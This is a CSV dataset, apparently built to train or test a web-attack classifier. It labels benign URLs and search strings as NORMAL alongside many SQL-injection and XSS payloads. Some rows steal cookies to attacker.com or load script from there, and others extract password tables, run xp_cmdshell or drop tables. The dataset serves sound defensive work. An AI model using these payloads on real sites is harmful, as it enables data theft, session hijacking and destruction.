text,label,threat_type
browse?tag=profile/edit?name=Johnathan,0,NORMAL
redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
<isindex type=image src=1 onerror=alert(1)>,2,XSS
catalog?page=2&sort=price_asc,0,NORMAL
query=mechanical+keyboard&page=1,0,NORMAL
browse?tag=api/v1/users?limit=10&offset=20,0,NORMAL
api/search?term=faq/shipping-times,0,NORMAL
filter?category=index.html&sort=desc,0,NORMAL
alice.smith@example.com,0,NORMAL
browse?tag=apple+macbook+pro+m2,0,NORMAL
login?user=admin' --,1,SQL_INJECTION
admin' --,1,SQL_INJECTION
"item?id="" OR ""1""=""1",1,SQL_INJECTION
item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
api/search?term=alice.smith@example.com,0,NORMAL
cart/checkout?step=billing,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
search?q=' OR 'a'='a,1,SQL_INJECTION
query=<img src=x onerror=alert('XSS')>,2,XSS
query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
"filter=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
search?q=<svg onload=alert(1)>,2,XSS
query=apple+macbook+pro+m2&page=1,0,NORMAL
search?q=account/security/2fa-setup,0,NORMAL
SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
search?q=4k+oled+television+lg,0,NORMAL
api/search?term=python+programming+book,0,NORMAL
redirect=<details open ontoggle=alert(1)>,2,XSS
admin' #,1,SQL_INJECTION
<img src=x onerror=alert('XSS')>,2,XSS
redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
search?q=settings?theme=dark&lang=en,0,NORMAL
) or ('1'='1,1,SQL_INJECTION
search?q=ergonomic+chair+mesh,0,NORMAL
search?q=cart/add?item_id=554&qty=1,0,NORMAL
browse?tag=faq/shipping-times,0,NORMAL
browse?tag=api/v1/users?limit=10&offset=20,0,NORMAL
browse?tag=shoes+for+running,0,NORMAL
search?q=' or 1=1/*,1,SQL_INJECTION
search?q=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
query=assets/css/main.css&page=1,0,NORMAL
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
"redirect=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
shoes for running,0,NORMAL
api/search?term=home,0,NORMAL
api/search?term=account/security/2fa-setup,0,NORMAL
search?q=cart/add?item_id=554&qty=1,0,NORMAL
""" OR ""1""=""1",1,SQL_INJECTION
search?q=account/security/2fa-setup,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
mechanical keyboard,0,NORMAL
search?q=python+programming+book,0,NORMAL
"<object data=""javascript:alert(1)"">",2,XSS
browse?tag=cotton+t-shirt+blue,0,NORMAL
cart/checkout?step=billing,0,NORMAL
"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
images/banner-sale.jpg,0,NORMAL
api/search?term=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
item?id=' or 1=1/*,1,SQL_INJECTION
api/search?term=password123!,0,NORMAL
"search?q=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
' OR 1=1 --,1,SQL_INJECTION
"item?id=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
download/specs-datasheet.pdf,0,NORMAL
login?user=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
query=<details open ontoggle=alert(1)>,2,XSS
login?user=) or ('1'='1,1,SQL_INJECTION
item?id=%27%20OR%201%3D1%20--,1,SQL_INJECTION
contact,0,NORMAL
item/privacy-policy?ref=homepage,0,NORMAL
gaming monitor,0,NORMAL
search?q=help/return-policy,0,NORMAL
order/status?tracking=FEDEX-889922,0,NORMAL
filter=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
order/status?tracking=FEDEX-889922,0,NORMAL
best headphones under 100,0,NORMAL
item/contact?ref=homepage,0,NORMAL
filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
mechanical keyboard,0,NORMAL
dashboard?view=summary,0,NORMAL
comment=<body onload=alert('XSS')>,2,XSS
item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
wireless mouse,0,NORMAL
api/v1/users?limit=10&offset=20,0,NORMAL
<marquee onstart=alert(1)>,2,XSS
' or 1=1/*,1,SQL_INJECTION
search?q=terms-and-conditions,0,NORMAL
api/search?term=newsletter/subscribe?email=user@test.org,0,NORMAL
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"<object data=""javascript:alert(1)"">",2,XSS
john_doe,0,NORMAL
<svg onload=alert(1)>,2,XSS
item?id=1' ORDER BY 1--+,1,SQL_INJECTION
reviews?rating=5&verified=true,0,NORMAL
"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
login?user='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
blog/post-10-cybersecurity-tips,0,NORMAL
filter?category=mechanical+keyboard&sort=desc,0,NORMAL
comment=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
"filter=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
login?user=' OR 1=1 --,1,SQL_INJECTION
filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
""" OR ""1""=""1",1,SQL_INJECTION
item?id=' HAVING 1=1 --,1,SQL_INJECTION
comment=<details open ontoggle=alert(1)>,2,XSS
filter?category=john_doe&sort=desc,0,NORMAL
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
) or ('1'='1,1,SQL_INJECTION
api/search?term=newsletter/subscribe?email=user@test.org,0,NORMAL
filter?category=index.html&sort=desc,0,NORMAL
"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
api/search?term=contact,0,NORMAL
browse?tag=cart/add?item_id=554&qty=1,0,NORMAL
password123!,0,NORMAL
api/search?term=shoes+for+running,0,NORMAL
item/gaming+monitor?ref=homepage,0,NORMAL
filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
filter?category=alice.smith@example.com&sort=desc,0,NORMAL
view_order?order_id=983214,0,NORMAL
query=john_doe&page=1,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
"1' UNION SELECT null, null, null--",1,SQL_INJECTION
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
account/security/2fa-setup,0,NORMAL
mechanical keyboard,0,NORMAL
query=admin_user_2024&page=1,0,NORMAL
query=<select autofocus onfocus=alert(1)>,2,XSS
best headphones under 100,0,NORMAL
%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
"query=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
api/search?term=best+headphones+under+100,0,NORMAL
<select autofocus onfocus=alert(1)>,2,XSS
item/john_doe?ref=homepage,0,NORMAL
api/search?term=dashboard?view=summary,0,NORMAL
filter=' or 1=1/*,1,SQL_INJECTION
search?q=images/banner-sale.jpg,0,NORMAL
terms-and-conditions,0,NORMAL
"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
item/shoes+for+running?ref=homepage,0,NORMAL
browse?tag=apple+macbook+pro+m2,0,NORMAL
%27%20OR%201%3D1%20--,1,SQL_INJECTION
redirect='><script>alert('PWNED')</script>,2,XSS
search?q=1; DROP TABLE users--,1,SQL_INJECTION
cart/checkout?step=billing,0,NORMAL
login?user=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
filter=' or 1=1/*,1,SQL_INJECTION
item/terms-and-conditions?ref=homepage,0,NORMAL
api/search?term=cotton+t-shirt+blue,0,NORMAL
api/search?term=search?q=4k+oled+television+lg,0,NORMAL
"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
item?id=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
' OR '1'='1,1,SQL_INJECTION
settings?theme=dark&lang=en,0,NORMAL
api/search?term=search?q=spring+sale+discount,0,NORMAL
item?id=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
search?q=images/banner-sale.jpg,0,NORMAL
filter=1' ORDER BY 2--+,1,SQL_INJECTION
images/banner-sale.jpg,0,NORMAL
filter=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
query=<marquee onstart=alert(1)>,2,XSS
download/specs-datasheet.pdf,0,NORMAL
search?q=dashboard?view=summary,0,NORMAL
apple macbook pro m2,0,NORMAL
search?q=1; DROP TABLE users--,1,SQL_INJECTION
1' ORDER BY 1--+,1,SQL_INJECTION
' HAVING 1=1 --,1,SQL_INJECTION
mechanical keyboard,0,NORMAL
browse?tag=usb+c+cable+2m,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
<svg onload=alert(1)>,2,XSS
1' ORDER BY 3--+,1,SQL_INJECTION
item?id=1' ORDER BY 3--+,1,SQL_INJECTION
"item?id=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
search?q=<script>alert(1)</script>,2,XSS
filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
blog/post-10-cybersecurity-tips,0,NORMAL
query=admin_user_2024&page=1,0,NORMAL
search?q=cotton+t-shirt+blue,0,NORMAL
settings?theme=dark&lang=en,0,NORMAL
browse?tag=search?q=mechanical+pencil+0.5mm,0,NORMAL
filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
item/assets/css/main.css?ref=homepage,0,NORMAL
search?q=contact,0,NORMAL
redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
cart/add?item_id=554&qty=1,0,NORMAL
search?q=shoes+for+running,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
query=cart/checkout?step=billing&page=1,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
assets/js/bundle.min.js,0,NORMAL
api/search?term=settings?theme=dark&lang=en,0,NORMAL
"redirect=""><script>alert(document.domain)</script>",2,XSS
filter=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
search?q=<svg/onload=alert('XSS')>,2,XSS
item/mechanical+keyboard?ref=homepage,0,NORMAL
item/view_order?order_id=983214?ref=homepage,0,NORMAL
cotton t-shirt blue,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
api/search?term=alice.smith@example.com,0,NORMAL
apple macbook pro m2,0,NORMAL
filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
1' ORDER BY 3--+,1,SQL_INJECTION
"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
<img src=x onerror=alert('XSS')>,2,XSS
"<object data=""javascript:alert(1)"">",2,XSS
filter?category=best+headphones+under+100&sort=desc,0,NORMAL
filter?category=api/v1/users?limit=10&offset=20&sort=desc,0,NORMAL
search?q=settings?theme=dark&lang=en,0,NORMAL
search?q=blog/post-10-cybersecurity-tips,0,NORMAL
mechanical keyboard,0,NORMAL
dashboard?view=summary,0,NORMAL
search?q=<details open ontoggle=alert(1)>,2,XSS
browse?tag=search?q=ergonomic+chair+mesh,0,NORMAL
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
<svg/onload=alert('XSS')>,2,XSS
catalog?page=2&sort=price_asc,0,NORMAL
admin' --,1,SQL_INJECTION
"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
search?q=<script>alert('XSS')</script>,2,XSS
"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
admin' --,1,SQL_INJECTION
item/usb+c+cable+2m?ref=homepage,0,NORMAL
"comment=<object data=""javascript:alert(1)"">",2,XSS
filter?category=account/security/2fa-setup&sort=desc,0,NORMAL
"search?q=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
api/search?term=settings?theme=dark&lang=en,0,NORMAL
settings?theme=dark&lang=en,0,NORMAL
order/status?tracking=FEDEX-889922,0,NORMAL
' OR 'a'='a,1,SQL_INJECTION
<img src=x onerror=alert('XSS')>,2,XSS
search?q=cart/checkout?step=billing,0,NORMAL
apple macbook pro m2,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"comment=<object data=""javascript:alert(1)"">",2,XSS
download/specs-datasheet.pdf,0,NORMAL
"filter=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
search?q=search?q=spring+sale+discount,0,NORMAL
cart/checkout?step=billing,0,NORMAL
"search?q=<video><source onerror=""javascript:alert(1)"">",2,XSS
""" OR ""1""=""1",1,SQL_INJECTION
1' AND SLEEP(10)--,1,SQL_INJECTION
search?q=best+headphones+under+100,0,NORMAL
admin' --,1,SQL_INJECTION
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
<isindex type=image src=1 onerror=alert(1)>,2,XSS
browse?tag=mechanical+keyboard,0,NORMAL
item?id=' HAVING 1=1 --,1,SQL_INJECTION
"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
assets/js/bundle.min.js,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
dashboard?view=summary,0,NORMAL
browse?tag=settings?theme=dark&lang=en,0,NORMAL
query=search?q=spring+sale+discount&page=1,0,NORMAL
mechanical keyboard,0,NORMAL
"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
redirect=<svg/onload=alert('XSS')>,2,XSS
api/search?term=assets/js/bundle.min.js,0,NORMAL
filter=%27%20OR%201%3D1%20--,1,SQL_INJECTION
search?q=4k+oled+television+lg,0,NORMAL
query=help/return-policy&page=1,0,NORMAL
laptop,0,NORMAL
item/api/v1/users?limit=10&offset=20?ref=homepage,0,NORMAL
%27%20OR%201%3D1%20--,1,SQL_INJECTION
contact,0,NORMAL
item?id=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
search?q=api/v1/users?limit=10&offset=20,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
mechanical keyboard,0,NORMAL
<svg onload=alert(1)>,2,XSS
1' ORDER BY 2--+,1,SQL_INJECTION
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
reviews?rating=5&verified=true,0,NORMAL
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
admin' #,1,SQL_INJECTION
' or 1=1#,1,SQL_INJECTION
search?q=' OR 1=1 --,1,SQL_INJECTION
redirect=<body onload=alert('XSS')>,2,XSS
"item?id="" OR ""1""=""1",1,SQL_INJECTION
"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
account/security/2fa-setup,0,NORMAL
filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
redirect=<select autofocus onfocus=alert(1)>,2,XSS
browse?tag=dashboard?view=summary,0,NORMAL
product?id=102&category=electronics,0,NORMAL
comment=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
password123!,0,NORMAL
assets/css/main.css,0,NORMAL
api/v1/users?limit=10&offset=20,0,NORMAL
1' ORDER BY 1--+,1,SQL_INJECTION
query=gaming+monitor&page=1,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
"<video><source onerror=""javascript:alert(1)"">",2,XSS
1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
query=product?id=102&category=electronics&page=1,0,NORMAL
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
api/search?term=john_doe,0,NORMAL
filter=' OR 'a'='a,1,SQL_INJECTION
query=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
search?q=product?id=102&category=electronics,0,NORMAL
profile/edit?name=Johnathan,0,NORMAL
cotton t-shirt blue,0,NORMAL
search?q=ergonomic+chair+mesh,0,NORMAL
index.html,0,NORMAL
query=privacy-policy&page=1,0,NORMAL
"filter=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
dashboard?view=summary,0,NORMAL
browse?tag=product?id=102&category=electronics,0,NORMAL
item/search?q=spring+sale+discount?ref=homepage,0,NORMAL
' OR 'a'='a,1,SQL_INJECTION
browse?tag=help/return-policy,0,NORMAL
query=<svg/onload=alert('XSS')>,2,XSS
filter=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
"query=<object data=""javascript:alert(1)"">",2,XSS
filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
dashboard?view=summary,0,NORMAL
"item?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
query='><script>alert('PWNED')</script>,2,XSS
search?q='><script>alert('PWNED')</script>,2,XSS
"comment=<video><source onerror=""javascript:alert(1)"">",2,XSS
index.html,0,NORMAL
browse?tag=search?q=mechanical+pencil+0.5mm,0,NORMAL
"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
search?q=<marquee onstart=alert(1)>,2,XSS
search?q=assets/js/bundle.min.js,0,NORMAL
api/search?term=python+programming+book,0,NORMAL
admin' #,1,SQL_INJECTION
browse?tag=blog/post-10-cybersecurity-tips,0,NORMAL
item?id=1; DROP TABLE users--,1,SQL_INJECTION
'><script>alert('PWNED')</script>,2,XSS
item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
filter=') or ('1'='1'--,1,SQL_INJECTION
<script>alert(1)</script>,2,XSS
api/search?term=mechanical+keyboard,0,NORMAL
filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
<svg/onload=alert('XSS')>,2,XSS
search?q=index.html,0,NORMAL
1' AND SLEEP(10)--,1,SQL_INJECTION
newsletter/subscribe?email=user@test.org,0,NORMAL
' HAVING 1=1 --,1,SQL_INJECTION
redirect=<marquee onstart=alert(1)>,2,XSS
filter=') or ('1'='1'--,1,SQL_INJECTION
shoes for running,0,NORMAL
laptop,0,NORMAL
<input autofocus onfocus=alert(1)>,2,XSS
browse?tag=product?id=102&category=electronics,0,NORMAL
filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
search?q=reviews?rating=5&verified=true,0,NORMAL
query=catalog?page=2&sort=price_asc&page=1,0,NORMAL
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
browse?tag=reviews?rating=5&verified=true,0,NORMAL
browse?tag=cart/checkout?step=billing,0,NORMAL
profile/edit?name=Johnathan,0,NORMAL
filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
filter?category=assets/css/main.css&sort=desc,0,NORMAL
query=dashboard?view=summary&page=1,0,NORMAL
%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
search?q=spring+sale+discount,0,NORMAL
%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
query=shoes+for+running&page=1,0,NORMAL
api/search?term=blog/post-10-cybersecurity-tips,0,NORMAL
item/home?ref=homepage,0,NORMAL
search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
redirect=<svg onload=alert(1)>,2,XSS
python programming book,0,NORMAL
browse?tag=products/audio/bluetooth-speakers,0,NORMAL
"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
comment=<script>alert(1)</script>,2,XSS
' or 1=1/*,1,SQL_INJECTION
contact,0,NORMAL
query='><script>alert('PWNED')</script>,2,XSS
<svg/onload=alert('XSS')>,2,XSS
<svg/onload=alert('XSS')>,2,XSS
'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
login?user=admin'/*,1,SQL_INJECTION
"<video><source onerror=""javascript:alert(1)"">",2,XSS
"filter=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
<body onload=alert('XSS')>,2,XSS
<marquee onstart=alert(1)>,2,XSS
help/return-policy,0,NORMAL
"login?user=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
admin'/*,1,SQL_INJECTION
browse?tag=cotton+t-shirt+blue,0,NORMAL
filter?category=search?q=ergonomic+chair+mesh&sort=desc,0,NORMAL
api/search?term=wireless+mouse,0,NORMAL
' or 1=1/*,1,SQL_INJECTION
account/security/2fa-setup,0,NORMAL
search?q=ergonomic+chair+mesh,0,NORMAL
api/search?term=about-us,0,NORMAL
faq/shipping-times,0,NORMAL
redirect='><script>alert('PWNED')</script>,2,XSS
comment=<select autofocus onfocus=alert(1)>,2,XSS
browse?tag=assets/js/bundle.min.js,0,NORMAL
login?user=1' ORDER BY 3--+,1,SQL_INJECTION
redirect=<select autofocus onfocus=alert(1)>,2,XSS
best headphones under 100,0,NORMAL
search?q=' or 1=1/*,1,SQL_INJECTION
"comment=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
wireless mouse,0,NORMAL
login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
filter?category=faq/shipping-times&sort=desc,0,NORMAL
search?q=') or ('1'='1'--,1,SQL_INJECTION
SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
about-us,0,NORMAL
api/search?term=john_doe,0,NORMAL
' or 1=1#,1,SQL_INJECTION
query=<svg/onload=alert('XSS')>,2,XSS
<script>alert(1)</script>,2,XSS
<marquee onstart=alert(1)>,2,XSS
search?q=profile/edit?name=Johnathan,0,NORMAL
api/search?term=admin_user_2024,0,NORMAL
""" OR ""1""=""1",1,SQL_INJECTION
"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
' or 1=1#,1,SQL_INJECTION
wireless mouse,0,NORMAL
login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
home,0,NORMAL
comment=<input autofocus onfocus=alert(1)>,2,XSS
profile/edit?name=Johnathan,0,NORMAL
filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
home,0,NORMAL
) or ('1'='1,1,SQL_INJECTION
reviews?rating=5&verified=true,0,NORMAL
api/search?term=shoes+for+running,0,NORMAL
item/product?id=102&category=electronics?ref=homepage,0,NORMAL
item/gaming+monitor?ref=homepage,0,NORMAL
%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
) or ('1'='1,1,SQL_INJECTION
redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
search?q=1' ORDER BY 1--+,1,SQL_INJECTION
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
1' ORDER BY 2--+,1,SQL_INJECTION
1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
laptop,0,NORMAL
<script>alert('XSS')</script>,2,XSS
login?user=1' ORDER BY 3--+,1,SQL_INJECTION
"""><script>alert(document.domain)</script>",2,XSS
redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
item/john_doe?ref=homepage,0,NORMAL
download/specs-datasheet.pdf,0,NORMAL
search?q=' OR '1'='1,1,SQL_INJECTION
browse?tag=reviews?rating=5&verified=true,0,NORMAL
browse?tag=search?q=ergonomic+chair+mesh,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
filter?category=view_order?order_id=983214&sort=desc,0,NORMAL
redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
search?q=' or 1=1#,1,SQL_INJECTION
search?q=admin_user_2024,0,NORMAL
item/terms-and-conditions?ref=homepage,0,NORMAL
filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
filter=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
faq/shipping-times,0,NORMAL
"1' UNION SELECT null, null, null--",1,SQL_INJECTION
dashboard?view=summary,0,NORMAL
"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
alice.smith@example.com,0,NORMAL
